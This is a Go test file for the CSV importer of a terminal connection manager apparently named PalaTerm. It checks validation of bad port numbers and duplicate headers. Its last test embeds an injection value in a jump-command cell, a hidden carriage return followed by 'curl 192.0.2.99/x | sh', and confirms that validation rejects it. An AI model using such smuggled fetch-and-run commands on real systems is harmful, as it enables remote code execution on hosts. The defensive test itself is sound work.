package csvio

import (
	"strings"
	"testing"

	"github.com/kojio145/palaterm/internal/model"
)

// A numeric cell that is no number ("2,222", full-width digits) used to
// become 0 and dial the default port; now Validate names it. Empty stays
// the default.
func TestImportBadNumberNamed(t *testing.T) {
	text := "name,host,conn,port,guiPort,bastion1Host,bastion1Port\r\n" +
		"lab-sw1,192.0.2.10,ssh,\"2,222\",,,\r\n" +
		"lab-sw2,192.0.2.11,ssh,２２２２,,,\r\n" +
		"lab-sw3,192.0.2.12,ssh,,x,,\r\n" +
		"lab-sw4,192.0.2.12,ssh,,,192.0.2.9,22x\r\n" +
		"lab-sw5,192.0.2.13,ssh,,,,\r\n"
	ds, err := Import(text)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"ポート番号が数字ではありません", "ポート番号が数字ではありません", "GUIポートが数字ではありません", "踏み台1段目のポート番号が数字ではありません", ""}
	for i, d := range ds {
		if i == 3 {
			d.Bastions[0].Username = "ops"
		}
		err := d.Validate()
		got := ""
		if err != nil {
			got = err.Error()
		}
		if got != want[i] {
			t.Errorf("%s: err = %q, want %q", d.Name, got, want[i])
		}
	}
	if ds[4].Port != 0 {
		t.Errorf("empty port = %d, want 0", ds[4].Port)
	}
}

// The same device column twice (an English and a Japanese header) is
// refused instead of the right-hand one silently winning; a column
// PalaTerm does not read may repeat.
func TestImportDuplicateHeader(t *testing.T) {
	_, err := Import("name,password,host,パスワード\r\nlab-sw1,Lab-Pw1,192.0.2.10,\r\n")
	if err == nil || !strings.Contains(err.Error(), "「パスワード」の列が 2 つあります（2 列目と 4 列目）") {
		t.Errorf("duplicate password column: %v", err)
	}
	_, err = Import("name,host,bastion1Host,踏み台1_ホスト\r\nlab-sw1,192.0.2.10,,\r\n")
	if err == nil || !strings.Contains(err.Error(), "列が 2 つあります") {
		t.Errorf("duplicate hop column: %v", err)
	}
	ds, err := Import("name,memo,host,memo\r\nlab-sw1,a,192.0.2.10,b\r\n")
	if err != nil || len(ds) != 1 || ds[0].Host != "192.0.2.10" {
		t.Errorf("repeated unknown column: %v %+v", err, ds)
	}
}

// A line break hidden in a quoted jump-command cell is caught by Validate
// (it would run a second command on the jump host).
func TestImportJumpCommandControlCharacter(t *testing.T) {
	text := "name,host,conn,bastion1Host,bastion1Username,bastion1JumpCommand\r\n" +
		"lab-sw1,192.0.2.10,ssh,192.0.2.9,ops,\"ssh {user}@{host}\rcurl 192.0.2.99/x | sh\"\r\n"
	ds, err := Import(text)
	if err != nil {
		t.Fatal(err)
	}
	if err := ds[0].Validate(); err == nil || !strings.Contains(err.Error(), "ジャンプコマンドに制御文字") {
		t.Errorf("Validate = %v", err)
	}
	if _, ok := any(ds[0]).(model.Device); !ok {
		t.Fatal("type")
	}
}
